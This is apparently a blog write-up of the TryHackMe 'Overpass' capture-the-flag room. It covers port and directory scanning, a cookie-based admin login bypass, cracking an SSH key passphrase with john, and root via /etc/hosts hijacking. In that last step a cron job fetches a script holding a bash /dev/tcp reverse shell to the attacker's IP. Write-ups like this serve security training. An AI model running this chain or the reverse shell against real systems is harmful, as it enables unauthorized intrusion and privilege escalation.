---
title: Tryhackme-Overpass
layout: post
categories:
- TryHackMe
tag:
- security
- easy
- cron
- owasp top 10
image: assets/img/overpass.png
image_alt: overpass
---

Overpass is easy room to get you started in CTF's.

## Recon
The first thing you will do is scan the target ip address to find open ports. We do it using **Nmap**.

```
$nmap -sSV -v 10.8.81.166
```
![nmap](/assets/img/tryhackme/overpass/nmap.png)

As we see here, 2 ports are open. One is HTTP:80 and the other is SSH:22. We can make a few guesses based on this. I think we should somehow find the necessary information for ssh connection from this site. And we have to get into the target machine using ssh. But this is just a guess for now.
Anyway, let's go to the website first and see what's up.

![homepage](/assets/img/tryhackme/overpass/homepage.png)

Overpass bir password manager miş. Ana Sayfada 2 sayfa bağlantısı daha gördük biri "About Us" diğeri "Download" ikisinide inceleyelim.

#### About Us
![aboutus](/assets/img/tryhackme/overpass/aboutus.png)

Here we see a few names that may be useful to us in the future.

#### Download
![download](/assets/img/tryhackme/overpass/download.png)

We see two files here, one is the source code of overpass and the other is the script that runs this code.
We couldn't find much, let's look at the source codes of the pages.

![home](/assets/img/tryhackme/overpass/home_source.png)

This is really fun.
We couldn't find anything remarkable in the source code of the About Us and Downloads pages.

Let's do a gobuster scan to see if there are other pages on the site.
```
$gobuster dir -u 10.10.79.124 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![aboutus](/assets/img/tryhackme/overpass/gobuster.png)

We found an interesting place /admin/ page here, let's examine it.
I tried a few login attempts first, but it didn't work.

![aboutus](/assets/img/tryhackme/overpass/admin.png)

Let's take a look at the source code of the admin page.

![aboutus](/assets/img/tryhackme/overpass/admin_id.png)

Maybe we can brute force using the information here.

![aboutus](/assets/img/tryhackme/overpass/admin_file.png)

And there are several javascript files, let's examine them.
The main.js contains nothing but the hello world output.

![aboutus](/assets/img/tryhackme/overpass/main.png)

Let's examine login.js now.

![aboutus](/assets/img/tryhackme/overpass/login.png)

We found something here. A login function has been placed here. It says that if you enter wrong information, you will get incorrect credentials, but if it is entered correctly, cookie settings will be set as SessionToken and status0Cookie. Let's try to login using this cookie information.

![aboutus](/assets/img/tryhackme/overpass/settings.png)

After entering the information, we refresh the page and we are inside.
We come across an SSH key, but there is an article before it.

![aboutus](/assets/img/tryhackme/overpass/admin_on.png)

Paradox was annoyed that James kept forgetting the password. And as punishment, he wrote the password as SSH Key.

![aboutus](/assets/img/tryhackme/overpass/ssh.png)

Let's find james' SSH password.
To crack the password of an rsa key, we need to follow these steps.
We create id_rsa file using **nano**. Copy and paste the rsa private key information into it. Then we change the permission settings using **chmod** so that ssh can use it.
Then we use **ssh2john** to bring this ssh key in a way that joh can crack, and then we find the password using **john**.

```
$nano id_rsa
$chmod 600 id_rsa
$ssh2john id_rsa > hash.txt
$john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

And we find the password **james13**
Now we can connect to james using this information.

```
$ssh -i id_rsa james@10.10.79.124
```

And we're inside

![aboutus](/assets/img/tryhackme/overpass/james.png)

Let's see what's in james' folder.

```
ls -la
```

![aboutus](/assets/img/tryhackme/overpass/ls.png)

There are a few files that caught our attention **todo.txt, user.txt**
user.txt : user flag

![aboutus](/assets/img/tryhackme/overpass/user_flag.png)

Now let's take a look at todo.txt.

![aboutus](/assets/img/tryhackme/overpass/todo.png)

Important things are being talked about here. James keeps a password around here, but he said he used his own password manager.
There was something he wanted to talk to Pardox about. He also says how the build script works automatically in the system.

I examined the files again using `ls -la` and there is another file called .overpass, and when I looked inside, I found something like this.

![aboutus](/assets/img/tryhackme/overpass/pass.png)

This must be the password that James mentioned in todo.txt, but we don't know how he encrypted it. But he told us they did it using their own password manager. So why don't we go back to the website and examine the source code of the overpass?
What I noticed when I reviewed the code is this.

![aboutus](/assets/img/tryhackme/overpass/source.png)

The algorithm they use according to the code they wrote is `rotate-47`

![aboutus](/assets/img/tryhackme/overpass/rot.png)

And here we found a password but I didn't understand where to put it.

But if we need to go back to todo.txt, James was talking about the continuous and automatic loading of the application there, why don't we look at the cronjob.

```
$cat /etc/crontab
```

![aboutus](/assets/img/tryhackme/overpass/cron.png)

And here we get important information. As we can see, the root user automatically runs the file overpass.thm/downloads/src/buildscript.sh as **cronjab**.
In other words, a bash file is running automatically in the system, if we can change this file, we can place our own reverse shell.
I tried to open and change the file several times, but I couldn't do anything because it exceeded my authorization limits. But there was one thing I missed, overpass.thm is a hostname and if we manage to change this hostname and enter our own machine information, I can run my own buildscript.sh file.
For this I first check the contents of /etc/hosts.

![aboutus](/assets/img/tryhackme/overpass/hosts.png)

Interestingly, James has the ability to modify this file.
Using my own machine ip, I change the overpass.thm line to` "10.8.81.166 overpass.thm"`
Then I will do the following in order on my own machine. I will create the /downloads/src/buildscript.sh file. And I will write revershell inside this file, then I will open an http.server just outside the downloads folder. At the same time, I will open a listener for nc using the same port as the port I entered in revershell. Then cronjab will connect to my machine and get the downoads/src/buildscript.sh file and then run it. The revershell inside it will also work and boom we'll go inside.

`buildscript.sh:  bash -i >& /dev/tcp/10.8.81.166/4444 >&1`

```
$mkdir downloads
$cd downloads
$mdir src
$cd src
$nano buildscript.sh
$cd ../..
$python3 -m http.server 80
```

```
nc -nlvp 4444
```
We are inside.

![aboutus](/assets/img/tryhackme/overpass/root.png)

And root flag .

![aboutus](/assets/img/tryhackme/overpass/root_flag.png)


It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care
